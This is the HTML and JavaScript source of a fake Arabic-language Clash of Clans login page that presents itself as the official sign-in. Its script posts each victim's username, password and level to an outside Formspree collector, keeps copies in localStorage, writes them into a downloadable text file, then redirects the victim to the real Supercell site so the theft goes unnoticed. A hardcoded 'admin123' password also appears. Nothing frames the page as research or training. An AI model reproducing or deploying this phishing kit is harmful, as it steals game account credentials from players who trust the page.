<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clash of Clans - ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§Ù„Ø±Ø³Ù…ÙŠ</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Cairo', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #1a237e, #0d47a1);
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: rgba(0, 0, 0, 0.85);
            border-radius: 15px;
            padding: 30px;
            border: 3px solid #FFD700;
            box-shadow: 0 10px 30px rgba(255, 215, 0, 0.3);
            max-width: 450px;
            width: 100%;
            text-align: center;
        }

        .logo {
            margin-bottom: 20px;
        }

        .logo img {
            max-width: 250px;
            filter: drop-shadow(0 0 10px #FFD700);
        }

        h1 {
            color: #FFD700;
            margin-bottom: 10px;
            font-size: 28px;
        }

        .subtitle {
            color: #aaa;
            margin-bottom: 25px;
            font-size: 16px;
        }

        .input-group {
            margin: 20px 0;
            text-align: right;
        }

        label {
            display: block;
            color: #FFD700;
            margin-bottom: 8px;
            font-weight: 600;
        }

        input, select {
            width: 100%;
            padding: 14px;
            border: 2px solid #FFD700;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            font-size: 16px;
        }

        input:focus, select:focus {
            outline: none;
            background: rgba(255, 255, 255, 0.15);
            box-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
        }

        .login-btn {
            background: linear-gradient(135deg, #FFD700, #FF8F00);
            color: #1a237e;
            border: none;
            padding: 16px;
            width: 100%;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            margin-top: 20px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .login-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 5px 15px rgba(255, 143, 0, 0.4);
        }

        .login-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .loader {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #FFD700;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .message {
            padding: 15px;
            border-radius: 8px;
            text-align: center;
            margin: 15px 0;
            font-weight: bold;
            display: none;
        }

        .success {
            background: rgba(76, 175, 80, 0.2);
            border: 2px solid #4CAF50;
            color: #4CAF50;
            display: block;
        }

        .error {
            background: rgba(244, 67, 54, 0.2);
            border: 2px solid #f44336;
            color: #f44336;
            display: block;
        }

        .countdown {
            font-size: 24px;
            color: #FFD700;
            margin: 10px 0;
        }

        .redirect-info {
            background: rgba(33, 150, 243, 0.1);
            border: 1px solid #2196F3;
            border-radius: 8px;
            padding: 15px;
            margin: 20px 0;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Ø§Ù„Ø´Ø¹Ø§Ø± -->
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/86/Clash_of_Clans_Logo.svg/2560px-Clash_of_Clans_Logo.svg.png" 
                 alt="Clash of Clans Logo">
        </div>

        <!-- Ø§Ù„Ø¹Ù†ÙˆØ§Ù† -->
        <h1>ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</h1>
        <p class="subtitle">Ø§Ø¯Ø®Ù„ Ø¥Ù„Ù‰ Ù‚Ø±ÙŠØªÙƒ ÙˆØ§Ø³ØªØ£Ù†Ù Ø§Ù„Ù…Ø¹Ø±ÙƒØ©</p>

        <!-- Ù†Ù…ÙˆØ°Ø¬ Ø§Ù„ØªØ³Ø¬ÙŠÙ„ -->
        <div class="input-group">
            <label for="username"><i class="fas fa-user"></i> Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…</label>
            <input type="text" id="username" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…" required>
        </div>

        <div class="input-group">
            <label for="password"><i class="fas fa-lock"></i> ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</label>
            <input type="password" id="password" placeholder="Ø£Ø¯Ø®Ù„ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±" required>
        </div>

        <div class="input-group">
            <label for="level"><i class="fas fa-trophy"></i> Ù…Ø³ØªÙˆÙ‰ Ø§Ù„Ù„Ø§Ø¹Ø¨</label>
            <select id="level" required>
                <option value="">Ø§Ø®ØªØ± Ù…Ø³ØªÙˆÙ‰ Ø§Ù„Ù„Ø§Ø¹Ø¨</option>
                <option value="1-50">Ø§Ù„Ù…Ø³ØªÙˆÙŠØ§Øª 1-50 (Ù…Ø¨ØªØ¯Ø¦)</option>
                <option value="51-100">Ø§Ù„Ù…Ø³ØªÙˆÙŠØ§Øª 51-100 (Ù…ØªÙˆØ³Ø·)</option>
                <option value="101-150">Ø§Ù„Ù…Ø³ØªÙˆÙŠØ§Øª 101-150 (Ù…ØªÙ‚Ø¯Ù…)</option>
                <option value="151+">Ø§Ù„Ù…Ø³ØªÙˆÙ‰ 151+ (Ù…Ø­ØªØ±Ù)</option>
            </select>
        </div>

        <!-- Ø²Ø± Ø§Ù„ØªØ³Ø¬ÙŠÙ„ -->
        <button class="login-btn" id="loginBtn" onclick="handleLogin()">
            <span id="btnText"><i class="fas fa-sign-in-alt"></i> ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„Ù„Ø¹Ø¨Ø©</span>
            <span id="btnLoader" class="loader" style="display: none;"></span>
        </button>

        <!-- Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ù†ØªÙŠØ¬Ø© -->
        <div id="message" class="message"></div>

        <!-- Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ -->
        <div id="redirectInfo" class="redirect-info" style="display: none;">
            <p><i class="fas fa-external-link-alt"></i> Ø¬Ø§Ø±ÙŠ ØªØ­ÙˆÙŠÙ„Ùƒ Ø¥Ù„Ù‰ Ø§Ù„Ù„Ø¹Ø¨Ø© Ø§Ù„Ø±Ø³Ù…ÙŠØ©...</p>
            <div class="countdown" id="countdown">3</div>
        </div>
    </div>

    <script>
        // ========== âš™ï¸ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù… ==========
        // ğŸ”— Ø±Ø§Ø¨Ø· Formspree
        const FORMSPREE_URL = 'https://formspree.io/a32f51470c454b56adb2a5b9de2b34f7.com';
        
        // ğŸ® Ø±Ø§Ø¨Ø· Ø§Ù„Ù„Ø¹Ø¨Ø© Ø§Ù„Ø±Ø³Ù…ÙŠØ©
        const OFFICIAL_GAME_URL = 'https://supercell.com/en/games/clashofclans/';
        
        // ğŸ”‘ ÙƒÙ„Ù…Ø© Ù…Ø±ÙˆØ± Ø§Ù„Ù…Ø³Ø¤ÙˆÙ„
        const ADMIN_PASSWORD = 'admin123';
        
        // â±ï¸ ÙˆÙ‚Øª Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ (Ø¨Ø§Ù„Ø«ÙˆØ§Ù†ÙŠ)
        const REDIRECT_DELAY = 3;

        // ========== Ø¯Ø§Ù„Ø© Ù…Ø¹Ø§Ù„Ø¬Ø© ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ ==========
        async function handleLogin() {
            // Ø¬Ù…Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value;
            const level = document.getElementById('level').value;
            
            // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
            if (!username || !password || !level) {
                showMessage('âš ï¸ ÙŠØ±Ø¬Ù‰ Ù…Ù„Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ„ Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©', 'error');
                return;
            }
            
            // Ø¹Ø±Ø¶ Ø­Ø§Ù„Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„
            const btnText = document.getElementById('btnText');
            const btnLoader = document.getElementById('btnLoader');
            const loginBtn = document.getElementById('loginBtn');
            
            btnText.innerHTML = '<i class="fas fa-spinner"></i> Ø¬Ø§Ø±ÙŠ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„...';
            btnLoader.style.display = 'inline-block';
            loginBtn.disabled = true;
            
            try {
                // 1. Ø­ÙØ¸ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ø­Ù„ÙŠØ§Ù‹
                const userData = {
                    username: username,
                    password: password,
                    level: level,
                    timestamp: new Date().toLocaleString('ar-SA'),
                    userAgent: navigator.userAgent
                };
                
                // Ø­ÙØ¸ ÙÙŠ LocalStorage
                let allData = JSON.parse(localStorage.getItem('coc_users') || '[]');
                allData.push(userData);
                localStorage.setItem('coc_users', JSON.stringify(allData));
                
                // 2. Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Formspree
                await sendToFormspree(userData);
                
                // 3. Ø¥Ù†Ø´Ø§Ø¡ Ù…Ù„Ù Ù„Ù„ØªÙ†Ø²ÙŠÙ„
                createDownloadFile(userData);
                
                // 4. Ø¹Ø±Ø¶ Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ù†Ø¬Ø§Ø­
                showMessage(`âœ… ØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ ${username} Ø¨Ù†Ø¬Ø§Ø­!`, 'success');
                
                // 5. Ø¨Ø¯Ø¡ Ø¹Ù…Ù„ÙŠØ© Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„Ù„Ø¹Ø¨Ø©
                startRedirectProcess(username);
                
                // 6. Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ù†Ù…ÙˆØ°Ø¬
                setTimeout(() => {
                    document.getElementById('username').value = '';
                    document.getElementById('password').value = '';
                    document.getElementById('level').value = '';
                }, 1000);
                
            } catch (error) {
                console.error('Login error:', error);
                showMessage('âš ï¸ Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„ØªØ³Ø¬ÙŠÙ„', 'error');
                
                btnText.innerHTML = '<i class="fas fa-sign-in-alt"></i> ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„Ù„Ø¹Ø¨Ø©';
                btnLoader.style.display = 'none';
                loginBtn.disabled = false;
            }
        }
        
        // ========== Ø¯Ø§Ù„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Formspree ==========
        async function sendToFormspree(data) {
            try {
                const formData = new FormData();
                formData.append('_subject', 'ğŸ® ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ø¬Ø¯ÙŠØ¯ - Clash of Clans');
                formData.append('username', data.username);
                formData.append('password', data.password);
                formData.append('level', data.level);
                formData.append('timestamp', data.timestamp);
                formData.append('_replyto', 'clash@formspree.com');
                formData.append('_format', 'plain');
                
                await fetch(FORMSPREE_URL, {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors'
                });
                
                console.log('ğŸ“§ ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ Formspree');
                return true;
                
            } catch (error) {
                console.error('Error sending to Formspree:', error);
                throw error;
            }
        }
        
        // ========== Ø¯Ø§Ù„Ø© Ø¥Ù†Ø´Ø§Ø¡ Ù…Ù„Ù Ù„Ù„ØªÙ†Ø²ÙŠÙ„ ==========
        function createDownloadFile(data) {
            try {
                const text = `
===========================================
      ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ø¬Ø¯ÙŠØ¯ - Clash of Clans
===========================================

ğŸ• Ø§Ù„ÙˆÙ‚Øª: ${data.timestamp}
ğŸ‘¤ Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: ${data.username}
ğŸ” ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±: ${data.password}
ğŸ® Ù…Ø³ØªÙˆÙ‰ Ø§Ù„Ù„Ø§Ø¹Ø¨: ${data.level}
ğŸ“± Ø§Ù„Ø¬Ù‡Ø§Ø²: ${data.userAgent}

===========================================
                ØªÙ… Ø§Ù„Ø­ÙØ¸ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹
===========================================
                `;
                
                const blob = new Blob([text], { type: 'text/plain;charset=utf-8' });
                const url = URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = url;
                link.download = `clash-login-${Date.now()}.txt`;
                link.style.display = 'none';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                URL.revokeObjectURL(url);
                
            } catch (error) {
                console.error('Error creating download file:', error);
            }
        }
        
        // ========== Ø¯Ø§Ù„Ø© Ø¨Ø¯Ø¡ Ø¹Ù…Ù„ÙŠØ© Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ ==========
        function startRedirectProcess(username) {
            // Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø²Ø± Ø§Ù„ØªØ³Ø¬ÙŠÙ„
            const btnText = document.getElementById('btnText');
            const btnLoader = document.getElementById('btnLoader');
            const loginBtn = document.getElementById('loginBtn');
            
            btnText.innerHTML = '<i class="fas fa-sign-in-alt"></i> ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„Ù„Ø¹Ø¨Ø©';
            btnLoader.style.display = 'none';
            loginBtn.disabled = false;
            
            // Ø¹Ø±Ø¶ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„
            const redirectInfo = document.getElementById('redirectInfo');
            redirectInfo.style.display = 'block';
            
            // Ø¨Ø¯Ø¡ Ø§Ù„Ø¹Ø¯ Ø§Ù„ØªÙ†Ø§Ø²Ù„ÙŠ
            let countdown = REDIRECT_DELAY;
            const countdownElement = document.getElementById('countdown');
            countdownElement.textContent = countdown;
            
            const countdownInterval = setInterval(() => {
                countdown--;
                countdownElement.textContent = countdown;
                
                if (countdown <= 0) {
                    clearInterval(countdownInterval);
                    redirectToOfficialGame(username);
                }
            }, 1000);
        }
        
        // ========== Ø¯Ø§Ù„Ø© Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„Ù„Ø¹Ø¨Ø© Ø§Ù„Ø±Ø³Ù…ÙŠØ© ==========
        function redirectToOfficialGame(username) {
            // Ø¹Ø±Ø¶ Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠØ©
            showMessage(`ğŸ® Ù…Ø±Ø­Ø¨Ø§Ù‹ ${username}! Ø¬Ø§Ø±ÙŠ ØªØ­ÙˆÙŠÙ„Ùƒ Ø¥Ù„Ù‰ Ø§Ù„Ù„Ø¹Ø¨Ø©...`, 'success');
            
            // Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ø¨Ø¹Ø¯ ØªØ£Ø®ÙŠØ± Ù‚ØµÙŠØ±
            setTimeout(() => {
                // 1. Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ ÙÙŠ Ù†ÙØ³ Ø§Ù„Ù†Ø§ÙØ°Ø©
                window.location.href = OFFICIAL_GAME_URL;
                
                // 2. Ø£Ùˆ Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ ÙÙŠ Ù†Ø§ÙØ°Ø© Ø¬Ø¯ÙŠØ¯Ø© (Ø§Ø®ØªØ± ÙˆØ§Ø­Ø¯Ø§Ù‹ ÙÙ‚Ø·)
                // window.open(OFFICIAL_GAME_URL, '_blank');
                
            }, 1000);
        }
        
        // ========== Ø¯Ø§Ù„Ø© Ø¹Ø±Ø¶ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ ==========
        function showMessage(message, type) {
            const messageDiv = document.getElementById('message');
            messageDiv.textContent = message;
            messageDiv.className = 'message ' + type;
            messageDiv.style.display = 'block';
            
            if (type === 'success') {
                setTimeout(() => {
                    messageDiv.style.display = 'none';
                }, 5000);
            }
        }
        
        // ========== ØªÙ‡ÙŠØ¦Ø© Ø§Ù„ØµÙØ­Ø© ==========
        window.addEventListener('load', function() {
            console.log('ğŸš€ ØµÙØ­Ø© ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¬Ø§Ù‡Ø²Ø©!');
            console.log('ğŸ® Ø±Ø§Ø¨Ø· Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„:', OFFICIAL_GAME_URL);
            console.log('ğŸ“§ Formspree URL:', FORMSPREE_URL);
        });
        
        // ========== Ø§Ø®ØªØµØ§Ø± Ù„ÙˆØ­Ø© Ø§Ù„Ù…ÙØ§ØªÙŠØ­ ==========
        document.addEventListener('keydown', function(event) {
            // Ctrl + Enter Ù„ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„
            if (event.ctrlKey && event.key === 'Enter') {
                event.preventDefault();
                handleLogin();
            }
        });
    </script>
</body>
</html>
